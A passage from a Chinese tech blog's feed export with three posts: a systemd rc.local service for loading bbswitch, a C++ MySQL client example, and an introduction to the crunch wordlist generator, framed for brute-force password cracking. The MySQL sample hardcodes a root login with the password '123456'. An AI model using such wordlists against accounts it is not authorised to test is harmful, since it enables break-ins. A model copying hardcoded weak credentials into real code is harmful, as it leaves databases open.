<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nano /etc/systemd/system/rc-local.service<br>[Unit]<br>Description=<span class="hljs-string">&quot;/etc/rc.local Compatibility&quot;</span> <br><br>[Service]<br>Type=forking<br>ExecStart=/etc/rc.local start<br>TimeoutSec=0<br>StandardInput=tty<br>RemainAfterExit=yes<br>SysVStartPriority=99<br><br>[Install]<br>WantedBy=multi-user.target<br></code></pre></div></td></tr></table></figure>
<p>其中<code>/etc/rc.local</code>就是要执行shell的启动脚步，开机时让modprobe加载bbswitch</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>modprobe bbswitch<br></code></pre></div></td></tr></table></figure>
<p>注意一定要赋予rc.local执行权限 <code>chmod +x /etc/rc.local</code>，最后将服务<code>rc-local</code>设置为开机启动 <code>systemctl enable rc-local.service</code>。</p>
<p>重启计算机后<code>systemctl status rc-local.service</code> 查看rc-local服务状态。</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">● rc-<span class="hljs-built_in">local</span>.service - <span class="hljs-string">&quot;/etc/rc.local Compatibility&quot;</span><br>   Loaded: loaded (/etc/systemd/<span class="hljs-keyword">system</span>/rc-<span class="hljs-built_in">local</span>.service; enabled; vendor preset: disabled)<br>   Active: active (exited) since Fri <span class="hljs-number">2020</span><span class="hljs-number">-02</span><span class="hljs-number">-14</span> <span class="hljs-number">09</span>:<span class="hljs-number">55</span>:<span class="hljs-number">13</span> CST; <span class="hljs-number">4</span>h <span class="hljs-number">35</span><span class="hljs-built_in">min</span> ago<br>    Tasks: <span class="hljs-number">0</span> (limit: <span class="hljs-number">4915</span>)<br>   Memory: <span class="hljs-number">0</span>B<br>   CGroup: /<span class="hljs-keyword">system</span>.slice/rc-<span class="hljs-built_in">local</span>.service<br><br><span class="hljs-number">2</span>月 <span class="hljs-number">14</span> <span class="hljs-number">09</span>:<span class="hljs-number">55</span>:<span class="hljs-number">13</span> <span class="hljs-keyword">system</span> systemd[<span class="hljs-number">1</span>]: Starting <span class="hljs-string">&quot;/etc/rc.local Compatibility&quot;</span>...<br><span class="hljs-number">2</span>月 <span class="hljs-number">14</span> <span class="hljs-number">09</span>:<span class="hljs-number">55</span>:<span class="hljs-number">13</span> <span class="hljs-keyword">system</span> systemd[<span class="hljs-number">1</span>]: Started <span class="hljs-string">&quot;/etc/rc.local Compatibility&quot;</span>.<br><span class="hljs-number">2</span>月 <span class="hljs-number">14</span> <span class="hljs-number">10</span>:<span class="hljs-number">07</span>:<span class="hljs-number">31</span> <span class="hljs-keyword">system</span> systemd[<span class="hljs-number">1</span>]: /etc/systemd/<span class="hljs-keyword">system</span>/rc-<span class="hljs-built_in">local</span>.service:<span class="hljs-number">10</span>: Support <span class="hljs-keyword">for</span> option SysVStartPriority= has bee&gt;<br><span class="hljs-keyword">lines</span> <span class="hljs-number">1</span><span class="hljs-number">-10</span>/<span class="hljs-number">10</span> (END)<br></code></pre></div></td></tr></table></figure>
<h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h3>
<p><a href="https://xuchen.wang/archives/archbbswitch.html">Arch下使用bbswitch彻底禁用双显卡笔记本的独立显卡</a><br />
<a href="https://superuser.com/questions/278396/systemd-does-not-run-etc-rc-local">systemd does not run /etc/rc.local?</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下C++连接Mysql</title>
    <url>/linux-cpp-connect-mysql/</url>
    <content><![CDATA[<h3 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h3>
<p>在连接MySQL之前，确保系统安装了MySQL，并且安装了对应的库文件。可以到官网下载不同版本的MySQL（自行编译安装）<a href="https://dev.mysql.com/downloads/mysql/">传送门&gt;&gt;</a>具体安装方法不再多说</p>
<span id="more"></span>
<h3 id="代码"><a class="markdownIt-Anchor" href="#代码"></a> 代码</h3>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;mysql/mysql.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">connMYSQL</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//mysql_server_init(NULL,NULL,NULL);</span><br>    MYSQL mysql;<br>    <span class="hljs-built_in">mysql_init</span>(&amp;mysql);<br>    <span class="hljs-comment">//设置字符集 方法1</span><br>    <span class="hljs-keyword">int</span> r=<span class="hljs-built_in">mysql_options</span>(&amp;mysql,MYSQL_SET_CHARSET_NAME,<span class="hljs-string">&quot;utf8&quot;</span>);<br>    <span class="hljs-keyword">if</span>(r==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;设置字符集 utf8 ok\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//连接mysql</span><br>    MYSQL *m= <span class="hljs-built_in">mysql_real_connect</span>(&amp;mysql, <span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;123456&quot;</span>,<span class="hljs-string">&quot;db_0&quot;</span>, <span class="hljs-number">3306</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(!m)&#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> errorCode=<span class="hljs-built_in">mysql_errno</span>(&amp;mysql);<br>        <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *errorString=<span class="hljs-built_in">mysql_error</span>(&amp;mysql);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;连接数据库失败 : %s\n&quot;</span>,errorString);<br>    &#125;<br>    <span class="hljs-comment">//设置字符集 方法2</span><br>    <span class="hljs-built_in">mysql_query</span>(&amp;mysql,<span class="hljs-string">&quot;set names &#x27;utf8&#x27;;&quot;</span>);<br>    <span class="hljs-built_in">mysql_query</span>(&amp;mysql,<span class="hljs-string">&quot;select *from tb_0;&quot;</span>);<br>    <span class="hljs-comment">//获取资源结果集</span><br>    MYSQL_RES *result=<span class="hljs-built_in">mysql_store_result</span>(&amp;mysql);<br>    <span class="hljs-comment">//返回查询受影响的行</span><br>    <span class="hljs-keyword">int</span> affectedRows=<span class="hljs-built_in">mysql_affected_rows</span>(&amp;mysql);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;affected rows: %d \n&quot;</span>,affectedRows);<br>    <span class="hljs-comment">//获取记录数</span><br>    <span class="hljs-keyword">int</span> rowcount=<span class="hljs-built_in">mysql_num_rows</span>(result);<br>    <span class="hljs-comment">//获取字段数</span><br>    <span class="hljs-keyword">int</span> fieldcount=<span class="hljs-built_in">mysql_num_fields</span>(result);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;rowCount:%d fieldCount:%d \n&quot;</span>,rowcount,fieldcount);<br>    MYSQL_FIELD *field=<span class="hljs-literal">NULL</span>;<br>     <span class="hljs-comment">//遍历字段</span><br>    <span class="hljs-keyword">while</span> (field=<span class="hljs-built_in">mysql_fetch_field</span>(result))&#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;--&gt;&quot;</span>&lt;&lt;field-&gt;name&lt;&lt;std::endl;<br>    &#125;<br>    <span class="hljs-comment">//field= mysql_fetch_field_direct(result,0);</span><br>    <span class="hljs-comment">//field= mysql_fetch_field_direct(result,1);</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;——————————————————————————————\n&quot;</span>);<br>    <span class="hljs-comment">//char ** = MYSQL_ROW</span><br>    MYSQL_ROW row=<span class="hljs-literal">NULL</span>;<br>     <span class="hljs-comment">//遍历行</span><br>    <span class="hljs-keyword">while</span>(row=<span class="hljs-built_in">mysql_fetch_row</span>(result))&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\t%s\t%s\t%s\t%s\n&quot;</span>,row[<span class="hljs-number">0</span>],row[<span class="hljs-number">1</span>],row[<span class="hljs-number">2</span>],row[<span class="hljs-number">3</span>],row[<span class="hljs-number">4</span>]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;——————————————————————————————\n&quot;</span>);<br>    <span class="hljs-comment">//释放结果集</span><br>    <span class="hljs-built_in">mysql_free_result</span>(result);<br>    <span class="hljs-comment">//关闭连接</span><br>    <span class="hljs-built_in">mysql_close</span>(&amp;mysql);<br>    <span class="hljs-comment">//mysql_server_end();</span><br>    <span class="hljs-comment">//mysql_library_end();</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>      <span class="hljs-built_in">connMYSQL</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>由于我使用的是CLion，所以当我写出来的源文件是无法直接编译的，这时候可以在<br />
**<font color=red>CMakeLists.txt</font> **内添加 <strong>target_link_libraries(mysqlconn /usr/lib/libmysqlclient.so)</strong><br />
其中 mysqlconn 为项目名，/usr/lib/libmysqlclient.so 为库文件路径<br />
如 /usr/lib/ 不存在 <a href="http://libmysqlclient.so">libmysqlclient.so</a> 文件，那么可以用</p>
<blockquote>
<p>locate libmysqlclient</p>
</blockquote>
<p>找到系统内存在的 libmysqlclient库文件。<br />
比如我的本来是 /usr/lib/x86_64-linux-gnu/libmysqlclient.so ，那么我就可以设置个软链接</p>
<blockquote>
<p>ln -s /usr/lib/x86_64-linux-gnu/libmysqlclient.so /usr/lib/libmysqlclient.so</p>
</blockquote>
<p>或者简单点也可以直接</p>
<blockquote>
<p>g++ main.cpp -o test -lmysqlclient<br />
./test</p>
</blockquote>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>强大的Crunch字典生成工具</title>
    <url>/linux-crunch/</url>
    <content><![CDATA[<p>计算机里的字典这东西,说白了就是保存着大量的可知数据,一般是用来<strong>暴力破解</strong>的……而要想要爆破成功,就得有一个强大而又有用的字典.<br />
而Linux下的一个开源程序 <strong>crunch</strong> 就是为了对字典的生成而被创造出来的.</p>
<span id="more"></span>
<h3 id="crunch"><a class="markdownIt-Anchor" href="#crunch"></a> crunch</h3>
<p>安装很简单:<code>apt-get install crunch</code><br />
crunch的使用方法建议 <code>man crunch</code> 查看帮助文档,并且其中也有一些例子.</p>
<figure class="highlight applescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs applescript">CRUNCH(<span class="hljs-number">1</span>)                        General Commands Manual                        CRUNCH(<span class="hljs-number">1</span>)<br>NAME<br>       crunch - generate wordlists <span class="hljs-keyword">from</span> a <span class="hljs-built_in">character</span> <span class="hljs-keyword">set</span><br>SYNOPSIS<br>       crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset <span class="hljs-built_in">string</span>&gt;] [options]<br>DESCRIPTION<br>       Crunch  can  create  a  wordlist  based  <span class="hljs-keyword">on</span> criteria you specify.  The output <span class="hljs-keyword">from</span><br>       crunch can be sent <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> screen, <span class="hljs-built_in">file</span>,  <span class="hljs-keyword">or</span>  <span class="hljs-keyword">to</span>  another  program.   The  required<br>       parameters are:<br>       min-len<br>              The  minimum  <span class="hljs-built_in">length</span>  <span class="hljs-built_in">string</span>  you  want crunch <span class="hljs-keyword">to</span> start <span class="hljs-keyword">at</span>.  This option <span class="hljs-keyword">is</span><br>              required even <span class="hljs-keyword">for</span> parameters <span class="hljs-keyword">that</span> won&#x27;t use <span class="hljs-keyword">the</span> value.<br>       max-len<br>              The maximum <span class="hljs-built_in">length</span> <span class="hljs-built_in">string</span> you want  crunch  <span class="hljs-keyword">to</span>  <span class="hljs-keyword">end</span>  <span class="hljs-keyword">at</span>.   This  option  <span class="hljs-keyword">is</span><br>              required even <span class="hljs-keyword">for</span> parameters <span class="hljs-keyword">that</span> won&#x27;t use <span class="hljs-keyword">the</span> value.<br>       charset <span class="hljs-built_in">string</span><br>              You  may specify <span class="hljs-built_in">character</span> sets <span class="hljs-keyword">for</span> crunch <span class="hljs-keyword">to</span> use <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> command line <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span><br>              you leave <span class="hljs-keyword">it</span> blank crunch will use <span class="hljs-keyword">the</span> default <span class="hljs-built_in">character</span> sets.   The  order<br>              MUST  BE  lower  case  <span class="hljs-built_in">characters</span>, upper case <span class="hljs-built_in">characters</span>, numbers, <span class="hljs-keyword">and</span> <span class="hljs-keyword">then</span><br>              symbols.  If you don&#x27;t follow this order you will <span class="hljs-keyword">not</span> <span class="hljs-keyword">get</span> <span class="hljs-keyword">the</span>  results  you<br>              want.   You  MUST  specify  either  values <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">character</span> type <span class="hljs-keyword">or</span> a plus<br>              sign.  NOTE: If you want <span class="hljs-keyword">to</span> include <span class="hljs-keyword">the</span> <span class="hljs-literal">space</span> <span class="hljs-built_in">character</span> <span class="hljs-keyword">in</span>  your  <span class="hljs-built_in">character</span><br>              <span class="hljs-keyword">set</span>  you must escape <span class="hljs-keyword">it</span> using <span class="hljs-keyword">the</span> \ <span class="hljs-built_in">character</span> <span class="hljs-keyword">or</span> enclose your <span class="hljs-built_in">character</span> <span class="hljs-keyword">set</span><br>              <span class="hljs-keyword">in</span> quotes i.e. <span class="hljs-string">&quot;abc &quot;</span>.  See <span class="hljs-keyword">the</span> examples <span class="hljs-number">3</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-keyword">and</span> <span class="hljs-number">13</span> <span class="hljs-keyword">for</span> examples.<br>OPTIONS<br>       -b <span class="hljs-built_in">number</span>[type]<br>              Specifies <span class="hljs-keyword">the</span> size <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> output <span class="hljs-built_in">file</span>, only works  <span class="hljs-keyword">if</span>  -o  START  <span class="hljs-keyword">is</span>  used,<br>              i.e.:  <span class="hljs-number">60</span>MB  The output files will be <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> format <span class="hljs-keyword">of</span> starting letter-<span class="hljs-keyword">end</span>‐<br>              ing letter <span class="hljs-keyword">for</span> example: ./crunch <span class="hljs-number">4</span> <span class="hljs-number">5</span> -b <span class="hljs-number">20</span>mib  -o  START  will  generate  <span class="hljs-number">4</span><br>              files:  aaaa-gvfed.txt,  gvfee-ombqy.txt,  ombqz-wcydt.txt, wcydu-zzzzz.txt<br>              valid values <span class="hljs-keyword">for</span> type are kb, mb, gb, kib, mib, <span class="hljs-keyword">and</span> gib.  The  <span class="hljs-keyword">first</span>  three<br>              types are based <span class="hljs-keyword">on</span> <span class="hljs-number">1000</span> <span class="hljs-keyword">while</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> three types are based <span class="hljs-keyword">on</span> <span class="hljs-number">1024.</span>  NOTE<br>              There <span class="hljs-keyword">is</span> no <span class="hljs-literal">space</span> <span class="hljs-keyword">between</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">and</span> type.  For example <span class="hljs-number">500</span>mb  <span class="hljs-keyword">is</span>  cor‐<br>              rect <span class="hljs-number">500</span> mb <span class="hljs-keyword">is</span> NOT correct.<br>       -c <span class="hljs-built_in">number</span><br>              Specifies  <span class="hljs-keyword">the</span>  <span class="hljs-built_in">number</span>  <span class="hljs-keyword">of</span>  lines <span class="hljs-keyword">to</span> <span class="hljs-built_in">write</span> <span class="hljs-keyword">to</span> output <span class="hljs-built_in">file</span>, only works <span class="hljs-keyword">if</span> -o<br>              START <span class="hljs-keyword">is</span> used, i.e.: <span class="hljs-number">60</span>  The output files will be <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> format <span class="hljs-keyword">of</span> starting<br>              letter-ending   letter   <span class="hljs-keyword">for</span>   example:  ./crunch  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  -f  /pentest/pass‐<br>              <span class="hljs-built_in">word</span>/crunch/charset.lst mixalpha-numeric-all-<span class="hljs-literal">space</span>  -o  START  -c  <span class="hljs-number">60</span>  will<br>              <span class="hljs-literal">result</span>  <span class="hljs-keyword">in</span>  <span class="hljs-number">2</span> files: a<span class="hljs-number">-7.</span>txt <span class="hljs-keyword">and</span> <span class="hljs-number">8</span>-\ .txt  The reason <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> slash <span class="hljs-keyword">in</span>  <span class="hljs-keyword">the</span><br>              <span class="hljs-keyword">second</span> filename <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> ending <span class="hljs-built_in">character</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">space</span> <span class="hljs-keyword">and</span> ls has <span class="hljs-keyword">to</span> escape <span class="hljs-keyword">it</span> <span class="hljs-keyword">to</span><br>              print  <span class="hljs-keyword">it</span>.   Yes you will need <span class="hljs-keyword">to</span> <span class="hljs-keyword">put</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> \ when specifying <span class="hljs-keyword">the</span> filename<br>              because <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> <span class="hljs-built_in">character</span> <span class="hljs-keyword">is</span> a <span class="hljs-literal">space</span>.<br>       -d numbersymbol<br>              Limits <span class="hljs-keyword">the</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> duplicate <span class="hljs-built_in">characters</span>.  -d <span class="hljs-number">2</span>@  limits  <span class="hljs-keyword">the</span>  lower  case<br>              alphabet <span class="hljs-keyword">to</span> output like aab <span class="hljs-keyword">and</span> aac.  aaa would <span class="hljs-keyword">not</span> be generated <span class="hljs-keyword">as</span> <span class="hljs-keyword">that</span> <span class="hljs-keyword">is</span><br>              <span class="hljs-number">3</span> consecutive letters <span class="hljs-keyword">of</span> a.  The format <span class="hljs-keyword">is</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">then</span> symbol <span class="hljs-keyword">where</span>  <span class="hljs-built_in">number</span><br>              <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> maximum <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> consecutive <span class="hljs-built_in">characters</span> <span class="hljs-keyword">and</span> symbol <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> symbol <span class="hljs-keyword">of</span><br>              <span class="hljs-keyword">the</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">character</span> <span class="hljs-keyword">set</span> you want <span class="hljs-keyword">to</span> limit i.e. @,%^   See examples <span class="hljs-number">17</span><span class="hljs-number">-19.</span><br>       -e <span class="hljs-built_in">string</span><br>              Specifies when crunch should stop early<br>       -f /path/<span class="hljs-keyword">to</span>/charset.lst charset-<span class="hljs-built_in">name</span><br>              Specifies a <span class="hljs-built_in">character</span> <span class="hljs-keyword">set</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">the</span> charset.lst<br>       -i  Inverts  <span class="hljs-keyword">the</span>   output   so   instead   <span class="hljs-keyword">of</span>   aaa,aab,aac,aad,   etc   you   <span class="hljs-keyword">get</span><br>              aaa,baa,caa,daa,aba,bba, etc<br>       -l  When  you  use  <span class="hljs-keyword">the</span> -t option this option tells crunch which symbols should be<br>              treated <span class="hljs-keyword">as</span> literals.  This will allow you <span class="hljs-keyword">to</span> use <span class="hljs-keyword">the</span> placeholders  <span class="hljs-keyword">as</span>  let‐<br>              ters  <span class="hljs-keyword">in</span>  <span class="hljs-keyword">the</span>  pattern.   The -l option should be <span class="hljs-keyword">the</span> same <span class="hljs-built_in">length</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">the</span> -t<br>              option.  See example <span class="hljs-number">15.</span><br>       -m Merged <span class="hljs-keyword">with</span> -p.  Please use -p instead.<br>       -o wordlist.txt<br>              Specifies <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">to</span> <span class="hljs-built_in">write</span> <span class="hljs-keyword">the</span> output <span class="hljs-keyword">to</span>, eg: wordlist.txt<br>       -p charset OR -p word1 word2 ...<br>              Tells crunch <span class="hljs-keyword">to</span> generate <span class="hljs-built_in">words</span> <span class="hljs-keyword">that</span> don&#x27;t have  repeating  <span class="hljs-built_in">characters</span>.   By<br>              default  crunch  will  generate  a  wordlist size <span class="hljs-keyword">of</span> <span class="hljs-comment">#of_chars_in_charset ^</span><br>              max_length.  This option will instead generate <span class="hljs-comment">#of_chars_in_charset!.   The</span><br>              !  stands <span class="hljs-keyword">for</span> factorial.  For example <span class="hljs-built_in">say</span> <span class="hljs-keyword">the</span> charset <span class="hljs-keyword">is</span> abc <span class="hljs-keyword">and</span> max <span class="hljs-built_in">length</span><br>              <span class="hljs-keyword">is</span> <span class="hljs-number">4.</span>.  Crunch will <span class="hljs-keyword">by</span> default generate <span class="hljs-number">3</span>^<span class="hljs-number">4</span> = <span class="hljs-number">81</span> <span class="hljs-built_in">words</span>.  This  option  will<br>              instead generate <span class="hljs-number">3</span>! = <span class="hljs-number">3</span>x2x1 = <span class="hljs-number">6</span> <span class="hljs-built_in">words</span> (abc, acb, bac, bca, cab, cba).  THIS<br>              MUST BE THE LAST OPTION!  This option CANNOT be used <span class="hljs-keyword">with</span> -s <span class="hljs-keyword">and</span> <span class="hljs-keyword">it</span> ignores<br>              min <span class="hljs-keyword">and</span> max <span class="hljs-built_in">length</span> however you must still specify two numbers.<br>       -q filename.txt<br>              Tells  crunch  <span class="hljs-keyword">to</span> <span class="hljs-built_in">read</span> filename.txt <span class="hljs-keyword">and</span> permute what <span class="hljs-keyword">is</span> <span class="hljs-built_in">read</span>.  This <span class="hljs-keyword">is</span> like<br>              <span class="hljs-keyword">the</span> -p option except <span class="hljs-keyword">it</span> gets <span class="hljs-keyword">the</span> input <span class="hljs-keyword">from</span> filename.txt.<br>       -r Tells crunch <span class="hljs-keyword">to</span> resume generate <span class="hljs-built_in">words</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">it</span> left off.  -r only works <span class="hljs-keyword">if</span><br>              you  use -o.  You must use <span class="hljs-keyword">the</span> same command <span class="hljs-keyword">as</span> <span class="hljs-keyword">the</span> original command used <span class="hljs-keyword">to</span><br>              generate <span class="hljs-keyword">the</span> <span class="hljs-built_in">words</span>.  The only exception <span class="hljs-keyword">to</span> this <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> -s option.  If  your<br>              original  command  used  <span class="hljs-keyword">the</span> -s option you MUST remove <span class="hljs-keyword">it</span> <span class="hljs-keyword">before</span> you resume<br>              <span class="hljs-keyword">the</span> session.  Just add -r <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">end</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> original command.<br>       -s startblock<br>              Specifies a starting <span class="hljs-built_in">string</span>, eg: <span class="hljs-number">03</span>god22fs<br>       -t @,%^<br>              Specifies a pattern, eg: @@god@@@@ <span class="hljs-keyword">where</span> <span class="hljs-keyword">the</span> only <span class="hljs-keyword">the</span> @&#x27;s,  ,&#x27;s,  %&#x27;s,  <span class="hljs-keyword">and</span><br>              ^&#x27;s will change.<br>              @ will insert lower case <span class="hljs-built_in">characters</span><br>              , will insert upper case <span class="hljs-built_in">characters</span><br>              % will insert numbers<br>              ^ will insert symbols<br>       -u<br>              The -u option disables <span class="hljs-keyword">the</span> printpercentage thread.  This should be <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span><br>              option.<br>       -z gzip, bzip2, lzma, <span class="hljs-keyword">and</span> <span class="hljs-number">7</span>z<br>              Compresses <span class="hljs-keyword">the</span> output <span class="hljs-keyword">from</span> <span class="hljs-keyword">the</span>  -o  option.   Valid  parameters  are  gzip,<br>              bzip2, lzma, <span class="hljs-keyword">and</span> <span class="hljs-number">7</span>z.<br>              gzip  <span class="hljs-keyword">is</span>  <span class="hljs-keyword">the</span>  fastest  <span class="hljs-keyword">but</span>  <span class="hljs-keyword">the</span> compression <span class="hljs-keyword">is</span> minimal.  bzip2 <span class="hljs-keyword">is</span> a little<br>              slower than gzip <span class="hljs-keyword">but</span> has better compression.  <span class="hljs-number">7</span>z <span class="hljs-keyword">is</span>  slowest  <span class="hljs-keyword">but</span>  has  <span class="hljs-keyword">the</span><br>              best compression.<br></code></pre></div></td></tr></table></figure>
<p>命令格式为: <code>crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options]</code></p>
<ul>
<li>min-len: 生成字典的最小长度</li>
<li>max-len: 生成字典的最大长度</li>
</ul>
<p>其中,几个比较重要的参数:</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>-b</td>
<td>指定写入文件最大字节数,类型可为kb, mb, gb, kib, mib, and gib.注意此参数必须跟 -o START 一起使用</td>
</tr>
<tr>
<td>-c</td>
<td>指定写出文件的行数</td>
</tr>
<tr>
